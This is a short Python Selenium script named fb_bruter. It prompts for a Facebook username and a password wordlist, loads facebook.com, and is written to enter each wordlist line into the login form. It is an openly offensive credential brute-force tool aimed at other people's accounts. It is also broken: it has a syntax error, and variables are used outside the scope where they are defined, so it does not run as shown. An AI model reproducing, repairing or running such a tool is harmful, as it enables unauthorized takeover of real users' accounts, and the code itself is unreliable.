from selenium import webdriver


class fb_bruter:
    def __init__(self):
        self.username = input("[+] - Please enter Username / Phone Number : ")
        
    def callWordlist(self)
        try:
            path = input("[+] - Please enter path to the wordlist : ")
        except EOFError:
            print("[!] - Invalid wordlist path!")


    def findElements(self):
        self.user = fb.find_element_by_xpath('//*[@id="email"]')
        self.passw = fb.find_element_by_xpath('//*[@id="pass"]')
        self.login = fb.find_element_by_xpath('//*[@id="u_0_b"]')
        
        
fb = webdriver.Chrome()
fb.get('https://facebook.com')



with open(path, 'r') as file:
    for line in file:
        password = line
        user.send_keys(username)
        passw.send_keys(password)
        login.click()



